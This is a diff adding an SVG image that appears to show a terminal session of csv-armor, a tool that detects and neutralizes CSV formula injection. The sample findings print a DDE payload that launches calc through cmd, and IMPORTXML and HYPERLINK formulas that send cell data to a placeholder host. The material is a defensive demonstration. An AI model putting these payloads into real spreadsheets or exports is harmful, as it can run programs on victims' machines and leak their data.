@@ -1,0 +1,28 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="880" height="472" viewBox="0 0 880 472" font-family="Menlo, Consolas, monospace" font-size="13" xml:space="preserve">
+  <rect width="880" height="472" rx="10" fill="#101418"/>
+  <circle cx="24" cy="22" r="6" fill="#ff5f56"/>
+  <circle cx="44" cy="22" r="6" fill="#ffbd2e"/>
+  <circle cx="64" cy="22" r="6" fill="#27c93f"/>
+  <text x="440" y="27" fill="#8b949e" text-anchor="middle" font-size="12">csv-armor — neutralize CSV formula injection before spreadsheets run it</text>
+  <g fill="#c9d1d9">
+    <text x="24" y="60"><tspan fill="#7ee787">$</tspan> csv-armor scan examples/exports.csv</text>
+    <text x="24" y="84"><tspan fill="#79c0ff">examples/exports.csv</tspan></text>
+    <text x="24" y="104" fill="#8b949e">  5 finding(s) across 35 cells (comma-delimited)</text>
+    <text x="24" y="126">  <tspan fill="#e3b341">!</tspan>   R3C3  <tspan fill="#e3b341">[medium/formula]</tspan>  cell starts with "=" — the application evaluates it as a formula</text>
+    <text x="24" y="144" fill="#6e7681">         value: =1+1</text>
+    <text x="24" y="166">  <tspan fill="#f778ba">!!</tspan>  R4C3  <tspan fill="#f778ba">[high/dde]</tspan>  DDE payload piping to "cmd" — opening the file can execute a local program</text>
+    <text x="24" y="184" fill="#6e7681">         value: =cmd|' /C calc'!A0</text>
+    <text x="24" y="206">  <tspan fill="#f778ba">!!</tspan>  R5C3  <tspan fill="#f778ba">[high/exfiltration]</tspan>  calls IMPORTXML() — can send sheet data to an attacker-controlled host</text>
+    <text x="24" y="224" fill="#6e7681">         value: =IMPORTXML("http://example.test/x","//a")</text>
+    <text x="24" y="246">  <tspan fill="#8b949e">·</tspan>   R6C3  <tspan fill="#8b949e">[low/at-sign]</tspan>  cell starts with "@" — Excel evaluates legacy Lotus @-functions</text>
+    <text x="24" y="264" fill="#6e7681">         value: @SUM(A1:A9)</text>
+    <text x="24" y="286">  <tspan fill="#f778ba">!!</tspan>  R7C3  <tspan fill="#f778ba">[high/exfiltration]</tspan>  calls HYPERLINK() — can send sheet data to an attacker-controlled host</text>
+    <text x="24" y="304" fill="#6e7681">         value: =HYPERLINK("http://example.test?leak="&amp;A1)</text>
+    <text x="24" y="334" fill="#d2a8ff">summary (profile: all)</text>
+    <text x="24" y="354">  findings       5  (high 3, medium 1, low 1)</text>
+    <text x="24" y="372">  by kind        at-sign 1, dde 1, exfiltration 2, formula 1</text>
+    <text x="24" y="406"><tspan fill="#7ee787">$</tspan> csv-armor sanitize examples/exports.csv <tspan fill="#8b949e">| download-safe</tspan></text>
+    <text x="24" y="430" fill="#8b949e">  risky cells prefixed with ' — same display, nothing evaluates.</text>
+    <text x="24" y="450" fill="#7ee787">  exit 1 in CI when a high-severity payload ships.</text>
+  </g>
+</svg>
